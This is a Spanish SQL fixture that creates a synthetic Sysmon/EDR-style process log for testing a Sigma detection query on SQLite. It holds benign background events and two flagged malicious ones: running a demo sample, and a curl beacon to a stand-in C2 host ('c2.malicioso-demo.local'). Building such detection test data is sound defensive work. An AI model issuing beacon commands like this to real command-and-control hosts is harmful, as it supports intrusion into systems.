-- eventos.sql -- Log sintetico de creacion de procesos (formato tipo Sysmon/EDR).
-- Simula lo que un agente de endpoint habria registrado. Sirve para probar,
-- de verdad, la consulta que Sigma genera para el backend SQLite.

DROP TABLE IF EXISTS eventos;
CREATE TABLE eventos (
    UtcTime      TEXT,
    Image        TEXT,   -- ruta del ejecutable
    CommandLine  TEXT,   -- linea de comandos completa
    User         TEXT
);

-- Eventos normales (ruido de fondo, NO deben detectarse)
INSERT INTO eventos VALUES ('2026-09-22 08:00:01', '/usr/bin/bash',    'bash -l',                         'jose');
INSERT INTO eventos VALUES ('2026-09-22 08:00:05', '/usr/bin/curl',    'curl https://www.ual.es',         'jose');
INSERT INTO eventos VALUES ('2026-09-22 08:01:00', '/usr/bin/python3', 'python3 informe.py',              'jose');

-- Evento malicioso 1: se ejecuta la muestra (coincide por Image)
INSERT INTO eventos VALUES ('2026-09-22 08:02:11', '/home/jose/yara/muestras/muestra_demo', './muestra_demo', 'jose');

-- Evento malicioso 2: un proceso contacta con el C2 (coincide por CommandLine)
INSERT INTO eventos VALUES ('2026-09-22 08:02:30', '/usr/bin/curl',    'curl http://c2.malicioso-demo.local/beacon', 'jose');
